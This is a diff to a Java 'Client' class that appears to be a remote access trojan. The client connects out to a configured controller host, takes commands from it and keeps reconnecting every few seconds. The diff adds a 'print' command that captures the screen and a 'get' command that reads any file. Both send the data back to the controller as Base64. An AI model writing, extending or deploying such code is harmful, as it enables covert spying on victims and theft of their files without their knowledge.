@@ -5,8 +5,15 @@
  */
 package client;
 
+import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
+import java.awt.AWTException;
+import java.awt.Rectangle;
+import java.awt.Robot;
+import java.awt.Toolkit;
+import java.awt.image.BufferedImage;
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
+import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.IOException;
 import java.io.InputStreamReader;
@@ -16,10 +23,9 @@ import java.net.Socket;
 import java.nio.charset.Charset;
 import java.nio.file.Files;
 import java.nio.file.Paths;
-import java.util.ArrayList;
 import java.util.logging.Level;
 import java.util.logging.Logger;
-import javax.naming.spi.DirectoryManager;
+import javax.imageio.ImageIO;
 
 /**
  *
@@ -36,6 +42,10 @@ public class Client {
     private final static Integer portLocal = 8082;
 
     public Client() {
+
+    }
+
+    protected void connect() {
         try {
             InetAddress addr = InetAddress.getByName(Client.host);
             InetAddress addrLocal = InetAddress.getByName(Client.hostLocal);
@@ -52,6 +62,9 @@ public class Client {
                     case "info":
                         this.info();
                         continue;
+                    case "print":
+                        this.printScreen();
+                        continue;
                 }
                 if (line.startsWith("ls")) {
                     this.ls(line);
@@ -59,6 +72,10 @@ public class Client {
                 }
                 if (line.startsWith("cat")) {
                     this.cat(line);
+                    continue;
+                }
+                if (line.startsWith("get")) {
+                    this.get(line);
                     continue;
                 }
 
@@ -73,7 +90,33 @@ public class Client {
                 this.socket.close();
             } catch (IOException ex) {
                 System.out.println(ex.getMessage());
+            } catch (NullPointerException ex) {
+
             }
+            try {
+                Thread.sleep(4000);
+            } catch (InterruptedException ex1) {
+                Logger.getLogger(Client.class.getName()).log(Level.SEVERE, null, ex1);
+            }
+            connect();
+        }
+    }
+    
+    protected void printScreen(){
+        try {
+            Robot robot = new Robot();
+            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
+            BufferedImage capture = new Robot().createScreenCapture(screenRect);
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            ImageIO.write( capture, "bmp", baos );
+            baos.flush();
+            byte[] imageInByte = baos.toByteArray();
+            baos.close();
+            this.write("--begin file content--\r\n" + Base64.encode(imageInByte) + "\r\n--end file content--");
+        } catch (AWTException ex) {
+            Logger.getLogger(Client.class.getName()).log(Level.SEVERE, null, ex);
+        } catch (IOException ex) {
+            Logger.getLogger(Client.class.getName()).log(Level.SEVERE, null, ex);
         }
     }
 
@@ -146,6 +189,20 @@ public class Client {
         }
     }
 
+    protected void get(String line) {
+        String filePath = line.replace("get", "").trim();
+        if (filePath.equals("")) {
+            this.write("File name not provided");
+            return;
+        }
+        try {
+            this.write("--begin file content--\r\n" + Base64.encode(Files.readAllBytes(Paths.get(filePath))) + "\r\n--end file content--");
+        } catch (IOException ex) {
+            this.write("File not accesible.");
+            return;
+        }
+    }
+
     private void write(String message) {
         try {
             this.writer.write(message + "\r\n");
@@ -161,6 +218,7 @@ public class Client {
      */
     public static void main(String[] args) {
         Client client = new Client();
+        client.connect();
     }
 
 }
